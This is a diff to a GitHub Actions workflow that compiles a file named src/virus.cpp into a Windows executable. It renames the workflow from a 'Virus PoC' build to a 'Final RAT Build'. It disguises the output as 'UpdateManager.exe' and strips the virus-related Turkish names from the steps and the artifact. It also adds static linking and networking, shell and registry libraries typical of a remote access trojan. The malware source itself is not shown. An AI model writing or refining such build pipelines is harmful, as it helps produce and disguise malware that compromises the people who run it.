@@ -1,23 +1,16 @@
-name: Virus PoC Build
+name: Final RAT Build
 on: [push]
 
 jobs:
   build:
     runs-on: windows-latest
     steps:
-      - name: Kodu Cek
-        uses: actions/checkout@v4
-
-      - name: Derleyiciyi Hazirla
-        uses: microsoft/setup-msbuild@v2
-
-      - name: EXE Olustur
-        # Burada virus.cpp dosyanı derleyip 'SistemTesti.exe' adında bir dosya çıkarır
-        run: cl.exe /EHsc src/virus.cpp /Fe:SistemTesti.exe /link /SUBSYSTEM:WINDOWS
-
-      - name: EXE'yi Yukle
-        uses: actions/upload-artifact@v4
+      - uses: actions/checkout@v4
+      - uses: microsoft/setup-msbuild@v2
+      - name: Compile
+        run: cl.exe /EHsc /MT src/virus.cpp /Fe:UpdateManager.exe /link /SUBSYSTEM:WINDOWS ws2_32.lib shell32.lib advapi32.lib user32.lib
+      - uses: actions/upload-artifact@v4
         with:
-          name: Virus-Deneme-Paketi
-          path: SistemTesti.exe
+          name: Proje-Ciktisi
+          path: UpdateManager.exe
           
